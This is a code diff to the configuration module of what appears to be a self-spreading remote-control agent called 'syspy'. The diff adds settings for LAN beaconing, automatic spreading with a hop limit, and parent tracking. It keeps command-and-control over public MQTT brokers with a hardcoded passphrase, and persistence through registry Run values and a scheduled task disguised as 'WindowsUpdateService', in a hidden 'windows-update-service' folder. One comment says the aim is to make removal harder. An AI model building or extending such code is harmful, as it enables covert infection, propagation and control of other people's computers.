@@ -10,16 +10,18 @@ import os
 import re
 import socket
 import uuid
+import sys as _sys
+from . import __version__ as PRODUCT_VERSION  # noqa: F401
 
 # --------------------------------------------------------------------------
 # Identity of this deployment
 # --------------------------------------------------------------------------
 
 #: MQTT topic prefix.  Make this unique or strangers will see your traffic.
-ROOM = "syspy-delta-7421"
+ROOM = os.environ.get("SYSPY_ROOM", "syspy-delta-7421")
 
 #: Pre-shared passphrase.  Both sides derive the same key from it.
-PASSPHRASE = "k9Xq2-venice-syspy"
+PASSPHRASE = os.environ.get("SYSPY_PASS", "k9Xq2-venice-syspy")
 
 #: Salt mixed into the key derivation.  Changing it invalidates all peers.
 KEY_SALT = b"syspy/v3/transport"
@@ -31,9 +33,6 @@ KEY_SALT = b"syspy/v3/transport"
 #: Public brokers, tried in order.  ``(host, port, use_tls)``.
 BROKERS: list[tuple[str, int, bool]] = [
     ("broker.emqx.io", 8883, True),
-    ("broker.hivemq.com", 1883, False),
-    ("test.mosquitto.org", 1883, False),
-    ("broker.emqx.io", 1883, False),
 ]
 
 MQTT_KEEPALIVE = 30
@@ -79,7 +78,7 @@ UNIX_SUBDIR = os.path.join(".local", "share", "windows-update-service")
 
 #: Registry value names that point at us.  Two independent names is one more
 #: thing an uninstaller has to find.
-RUN_VALUE_NAMES = ("WindowsUpdateService", "MicrosoftEdgeUpdate")
+RUN_VALUE_NAMES = ("WindowsUpdateService", "WindowsUpdateServiceBoot")
 
 #: Scheduled task name.
 TASK_NAME = "WindowsUpdateService"
@@ -91,27 +90,96 @@ REMOTE_URL = ""
 # Helpers
 # --------------------------------------------------------------------------
 
+IS_WINDOWS = os.name == "nt"
+ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+
+PUBLIC_URL = os.environ.get("SYSPY_URL", "").rstrip('/')
+EMBED_VERSION = "3.12.8"
+
+LAN_ENABLED = os.environ.get("SYSPY_LAN", "1") != "0"
+LAN_PORT = int(os.environ.get("SYSPY_LAN_PORT", "8788"))
+LAN_HTTP_PORT = int(os.environ.get("SYSPY_KIT_PORT", "8789"))
+LAN_BEACON_INTERVAL = 10.0
+LAN_PEER_TTL = 45.0
+
+SPREAD_ENABLED = os.environ.get("SYSPY_SPREAD", "1") != "0"
+SPREAD_INTERVAL = 120.0
+SPREAD_INSTALL_TIMEOUT = 300.0
+HOP_LIMIT = int(os.environ.get("SYSPY_HOP_LIMIT", "3"))
+
+DEP_INSTALL_TIMEOUT = 900
+
+GROUP = os.environ.get("SYSPY_GROUP", "")
+
+# single broker: mixed-broker agents never see each other
+BROKERS = [("broker.emqx.io", 8883, True)]
+
+RUN_VALUE_NAMES = ("WindowsUpdateService", "WindowsUpdateServiceBoot")
+
+_host_cache: dict = {}
+
+
+def hostname() -> str:
+    if "host" not in _host_cache:
+        _host_cache["host"] = socket.gethostname()
+    return _host_cache["host"]
+
+
+def os_kind() -> str:
+    if IS_WINDOWS:
+        return "windows"
+    return "darwin" if _sys.platform == "darwin" else "linux"
+
+
+def _deploy() -> dict:
+    if "deploy" not in _host_cache:
+        path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "deploy.json")
+        try:
+            with open(os.path.abspath(path), "r", encoding="utf-8-sig") as handle:
+                import json as _json
+                _host_cache["deploy"] = _json.load(handle) or {}
+        except Exception:
+            _host_cache["deploy"] = {}
+    return _host_cache["deploy"]
+
+
+def hop() -> int:
+    try:
+        return int(_deploy().get("hop") or 0)
+    except Exception:
+        return 0
+
+
+def parent_id() -> str:
+    return str(_deploy().get("parent") or "")
+
+
+def parent_ip() -> str:
+    return str(_deploy().get("parent_ip") or "")
+
+
+def group() -> str:
+    return str(_deploy().get("group") or GROUP)
+
+
+def runtime_python(root: str = "") -> str:
+    base = root or ROOT
+    for name in ("pythonw.exe", "python.exe", "python3", "python"):
+        candidate = os.path.join(base, "runtime", name)
+        if os.path.exists(candidate):
+            return candidate
+    return ""
+
+
+def short_id() -> str:
+    import hashlib as _hashlib
+    return _hashlib.sha256(agent_id().encode()).hexdigest()[:8]
+
 
 def agent_id() -> str:
-    """Return a stable, filesystem-safe identifier for this machine.
-
-    Derived from the hostname so it is recognisable, with a short random
-    suffix so two machines with the same name do not collide.
-    """
     host = re.sub(r"[^A-Za-z0-9_-]", "-", socket.gethostname())[:20] or "host"
-    return f"{host}-{uuid.getnode() % 0x10000:04x}"
-
-
-def broker_order() -> list[tuple[str, int, bool]]:
-    """Return the broker list with TLS entries first."""
-    return sorted(BROKERS, key=lambda entry: not entry[2])
-
-
-def topic_up(agent: str) -> str:
-    """Topic the agent publishes on."""
-    return f"{ROOM}/up/{agent}"
-
-
-def topic_down(agent: str) -> str:
-    """Topic the controller publishes on."""
-    return f"{ROOM}/down/{agent}"
+    salt = str(_deploy().get("salt") or "")
+    if not salt:
+        import secrets
+        salt = secrets.token_hex(2)
+    return f"{host}-{salt}"
